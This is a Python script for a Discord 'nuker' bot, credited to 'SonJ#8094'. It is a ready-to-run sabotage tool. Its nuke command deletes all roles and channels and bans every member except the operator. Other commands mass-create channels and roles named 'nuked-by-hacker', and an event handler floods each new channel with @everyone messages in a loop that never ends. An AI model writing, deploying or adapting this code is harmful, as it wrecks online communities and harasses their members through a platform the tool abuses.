import os
import discord
from discord.ext import commands

# Variable set ==========

prefix = "!" # Prefix
userid = [PUT-YOUR-USER-ID-HERE] # The user that only allowed to execute nuke commands. 

intents = discord.Intents.default() # Set Discord Intents to default
intents = discord.Intents(messages=True, guilds=True, members=True) # Change Discord intents

# =======================

bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help") # Remove the help command

@bot.command()
async def stop(ctx):
	if ctx.author.id in userid:
		bot.close()
	else:
		print(f"Lmao, {ctx.author} with ID {ctx.author.id} tried the stop command")
		pass

@bot.command()
async def nuke(ctx):
	# First check if the author is executing command

	if ctx.author.id in userid:
		# Proceed command
		guild = bot.get_guild(ctx.guild.id)

		for role in guild.roles:
			try:
				await role.delete()
				print(f"Deleted role: {role}")
			except:
				print(f"Cant delete role: {role}")
				pass

		for member in guild.members:
			try:
				if member.id in userid:
					print(f"Tried to not ban {member} with ID {member.id}")
					pass
				else:
					await member.ban(reason="Nuke By Hacker")
					print(f"Banned member: {member}")
			except:
				print(f"Cant ban member: {member}")
				pass

		for channel in guild.channels:
			try:
				await channel.delete()
				print(f"Deleted channel: {channel}")
			except:
				print(f"Cant delete channel: {channel}")
				pass

		await ctx.guild.create_text_channel("Server Has Nuked!")
	else:
		print(f"Lmao, {ctx.author} with ID {ctx.author.id} tried the nuke command")
		pass

@bot.command()
async def spamchannel(ctx):
	if ctx.author.id in userid:
		a = 1
		while a < 20:
			await ctx.guild.create_text_channel("nuked-by-hacker")
			print(f"{a} channels created")
			a += 1
	else:
		print(f"Lmao, {ctx.author} with ID {ctx.author.id} tried the spamch command")
		pass

@bot.command()
async def spamrole(ctx):
	if ctx.author.id in userid:
		a = 1
		while a < 20:
			await ctx.guild.create_role(name="Nuked by Hacker")
			print(f"{a} roles created")
			a += 1
	else:
		print(f"Lmao, {ctx.author} with ID {ctx.author.id} tried the spamrole command")
		pass

@bot.event
async def on_ready():
	print(f"Bot name: {bot.user.name}")
	print(f"Bot ID: {bot.user.id}")
	print("✅ All Command Are Ready!")
	print("Nuker Made By SonJ#8094")


@bot.event 
async def on_guild_channel_create(channel):
	msg = """@everyone @here Server Nuked By Hacker
	"""
	a = 1
	while a < 10:
		await channel.send(msg)

TOKEN = ['PUT-YOUR-TOKEN-HERE']

bot.run('PUT-YOUR-TOKEN-HERE') # Run the bot
